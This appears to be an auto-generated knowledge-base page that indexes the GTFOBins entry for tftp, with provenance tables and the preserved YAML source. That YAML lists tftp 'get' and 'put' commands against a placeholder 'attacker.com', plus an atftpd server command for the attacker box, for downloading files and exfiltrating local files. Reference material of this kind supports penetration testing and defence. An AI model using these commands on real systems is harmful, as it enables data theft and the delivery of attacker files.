---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# tftp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `tftp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tftp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [tftp](../../tools/linux/tftp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | tftp |
| name | tftp |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/tftp/ |

## Preserved Source Material

```yaml
_body: ''
_name: tftp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tftp
functions:
  download:
  - code: 'tftp attacker.com

      get /path/to/input-file'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender:
      code: atftpd --no-fork --verbose --daemon --no-fork --user root.root .
      comment: A TFTP server can be used on the attacker box to send the data.
  upload:
  - code: 'tftp attacker.com

      put /path/to/input-file'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver:
      code: atftpd --no-fork --verbose --daemon --no-fork --user root.root .
      comment: A TFTP server can be used on the attacker box to receive the data.
```
